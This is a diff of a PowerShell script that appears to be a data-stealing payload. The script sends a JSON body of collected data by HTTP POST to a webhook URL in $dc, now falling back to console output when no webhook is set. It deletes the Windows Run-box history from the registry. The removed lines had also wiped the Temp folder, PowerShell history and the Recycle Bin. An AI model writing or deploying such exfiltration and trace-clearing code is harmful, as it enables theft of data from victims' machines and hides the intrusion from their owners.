@@ -39,24 +39,21 @@ $jsonBody = @{
     
 } | ConvertTo-Json
 
+#if webhook is defined Invoke-RestMethod -Uri $dc -Method Post -ContentType "application/json" -Body $jsonBody
+# If not defined, output to console
 
-Invoke-RestMethod -Uri $dc -Method Post -ContentType "application/json" -Body $jsonBody
-
-# Delete contents of Temp folder 
-
-rm $env:TEMP\* -r -Force -ErrorAction SilentlyContinue
+if ($dc) {
+    Invoke-RestMethod -Uri $dc -Method Post -ContentType "application/json" -Body $jsonBody
+} else {
+    Write-Host $jsonBody
+}
 
 # Delete run box history
 
 reg delete HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU /va /f
 
-# Delete powershell history
 
-Remove-Item (Get-PSreadlineOption).HistorySavePath
 
-# Deletes contents of recycle bin
-
-Clear-RecycleBin -Force -ErrorAction SilentlyContinue
-
+exit
 
 
